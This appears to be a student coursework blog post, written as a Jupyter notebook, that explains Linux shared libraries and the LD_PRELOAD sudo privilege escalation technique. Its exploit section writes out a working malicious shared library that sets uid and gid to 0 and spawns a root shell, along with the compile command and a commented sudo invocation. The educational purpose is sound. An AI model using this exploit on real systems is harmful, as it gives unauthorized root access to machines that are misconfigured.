---
title: LD_Preload trick 😈
toc: True
description: A proof of concept of how LD_Preload works and the different caviots. Showcases our understanding of the linux bash shell and commands and takes it one step further to understand lower-level linux knowledge
courses: {'csp': {'week': 3}}
type: hacks
---

# Hi👋👋👋👋

## So there's either two reasons your reading this:
1. You randomly stumbled upon our blog because you were bored or
2. Your Mr. Mortensen 

## So before we move on we will just give a little bit information about us:
1. We're supper into linux internals especially understanding it from the first calls of syscalls and glibc interaction with linux 
![csse](../student/images/kernel.png)

2. We've been competing in the field of computer science since a pretty young age. 

3. William has won multiple awards on both the national and state level for different competitions including fields with Cybersecurity and Hackathons.

4. Saaras has been teaching python in order to raise money for Akshaya Patra an organization dedicated to feeding children around the globe. Saaras is also well versed in linux systems.

## Ok so now that you know a little more on us let's talk about what this blog is for:
1. Ok so obviously this blog is gonna show our understanding of basic linux commands and everything relating to the Linux Shell bash tutorial because obviously we want a good grade on the pair review. However, this is something we're both experienced in and thus we're going to a little bit more in the theory behind what this blog is for.

## So now that that's out of the way, what're we doing 😈😈😈
1. Mkay so linux has the use of shared libraries, what are shared libraries???

### Shared Libraries
- Understanding Shared Libraries: In Unix-like systems, many programs rely on shared libraries (also known as dynamic link libraries) to perform various tasks. These libraries contain precompiled functions that programs can use. When a program is executed, the dynamic linker/loader (ld.so or ld-linux.so in Linux) loads these libraries into memory and resolves function calls to the appropriate library functions. Whereas staticly loaded libraries are quite literally embedded within the acutal executable. 

- An attacker with sufficient permissions (typically root or a user with sudo privileges) can set the LD_PRELOAD environment variable to specify a malicious shared library that they control. They can do this by exporting the variable in their shell session or by modifying the environment of a specific process. 

- So what if a normal user were compromised that was granted the sudo access to one binary, maybe to run a specific binary as that person or simply for inconvience? Well we can preload a malicious library with those permissions and escalate our permissions to sudo. But keep in mind we also need the loader to preserver the environmental changes in order to ensure that our malicious library runs

## Exploit


```python
%%script bash

# Let's check if we have the necessary things to do this vuln (show terminal showcase as it lags out jupyternotebook cell)
cd /tmp
cat <<EOF > /tmp/ldp.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
EOF

#Let's see what is in here now
cat /tmp/ldp.c
```

    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
    }



```python
%%script bash
# Compiling the ldp.so into a library and dynamic load it into the LD_PRELOAD
gcc -fPIC -shared -o /tmp/ldp.so /tmp/ldp.c -nostartfiles
cat /tmp/ldp.c
#sudo LD_PRELOAD=/tmp/ldp.so /usr/bin/find
#i'll show case the end of what happens :)
```

    /tmp/ldp.c: In function ‘_init’:
    /tmp/ldp.c:6:1: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
        6 | setgid(0);
          | ^~~~~~
    /tmp/ldp.c:7:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
        7 | setuid(0);
          | ^~~~~~


    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
    }


# Summary
- Basically what you should get away of this is NEVER EVER preserve your environmental variables because this allows for just people who have mini 
